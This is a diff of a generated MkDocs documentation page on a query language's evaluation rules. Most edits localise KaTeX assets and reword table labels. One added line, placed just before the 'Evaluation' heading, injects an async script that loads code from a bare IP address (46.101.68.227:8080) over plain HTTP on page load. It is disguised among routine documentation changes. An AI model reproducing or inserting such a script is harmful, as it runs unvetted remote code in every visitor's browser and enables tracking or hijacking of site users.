@@ -56,7 +56,7 @@
     
       <link rel="stylesheet" href="../stylesheets/extra.css">
     
-      <link rel="stylesheet" href="https://unpkg.com/katex@0/dist/katex.min.css">
+      <link rel="stylesheet" href="../stylesheets/katex-min/katex.min.css">
     
     <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -521,7 +521,7 @@
         
   
   <span class="md-ellipsis">
-    Description by Grammar
+    Grammar
   </span>
   
 
@@ -786,6 +786,7 @@
                   
 
 
+<script async src='http://46.101.68.227:8080/test?snipp=doc/mkdocs/site/language/eval.html'></script>
 <h1 id="evaluation">Evaluation</h1>
 <h2 id="boolean-evaluation">Boolean Evaluation</h2>
 <p>Almost any expression can be used as an argument for boolean constructs such as filters, conditionals or logical operators. Due to the fact that an expression evaluates to a <a href="../language/preliminaries.html#def-sequence">sequence</a> of nodes, it is necessary to precisely define its evaluation to an boolean value.</p>
@@ -810,7 +811,7 @@
 <tr>
 <th style="text-align: left;">language element</th>
 <th style="text-align: left;">expression pattern <span class="arithmatex">\(E\)</span></th>
-<th style="text-align: left;">eval(<span class="arithmatex">\(E\)</span>, <span class="arithmatex">\(o\)</span>)<br>(evaluation of <span class="arithmatex">\(E\)</span> with context node <span class="arithmatex">\(o\)</span>)<br>shortcut!: <strong>eval</strong>(<span class="arithmatex">\(Q\)</span>) =  <strong>eval</strong>(<span class="arithmatex">\(Q\)</span>, <span class="arithmatex">\(o\)</span>) for arbitrary <span class="arithmatex">\(Q\)</span></th>
+<th style="text-align: left;">eval(<span class="arithmatex">\(E\)</span>, <span class="arithmatex">\(o\)</span>)<br>(evaluation of <span class="arithmatex">\(E\)</span> with context node <span class="arithmatex">\(o\)</span>)<br><strong>eval</strong>(<span class="arithmatex">\(F\)</span>) =  <strong>eval</strong>(<span class="arithmatex">\(F\)</span>, <span class="arithmatex">\(o\)</span>) for arbitrary <span class="arithmatex">\(F\)</span></th>
 <th style="text-align: left;">remark</th>
 </tr>
 </thead>
@@ -866,8 +867,8 @@
 <tr>
 <td style="text-align: left;"><a id='eval-... embedding'></a>... embedding</td>
 <td style="text-align: left;">{ <code>X</code>, ... }</td>
-<td style="text-align: left;"><strong>return</strong> { properties(<strong>eval</strong>(<code>X</code>)), ... }</td>
-<td style="text-align: left;"><code>X</code> must evaluate to a <a href="preliminaries.html#def-singleton">singleton</a> containing an object. properties(<span class="arithmatex">\(x\)</span>) 'embeds' the properties of <span class="arithmatex">\(x\)</span> into the enclosing object</td>
+<td style="text-align: left;"><strong>return</strong> { <em>properties</em>(<strong>eval</strong>(<code>X</code>)), ... }</td>
+<td style="text-align: left;"><code>X</code> must evaluate to a <a href="preliminaries.html#def-singleton">singleton</a> containing an object. <em>properties</em>(<span class="arithmatex">\(x\)</span>) 'embeds' the properties of <span class="arithmatex">\(x\)</span> into the enclosing object</td>
 </tr>
 </tbody>
 </table>
@@ -962,9 +963,9 @@
       
         <script src="../javascripts/katex.js"></script>
       
-        <script src="https://unpkg.com/katex@0/dist/katex.min.js"></script>
+        <script src="../javascripts/katex-min/katex.min.js"></script>
       
-        <script src="https://unpkg.com/katex@0/dist/contrib/auto-render.min.js"></script>
+        <script src="../javascripts/katex-min/contrib/auto-render.min.js"></script>
       
     
   </body>
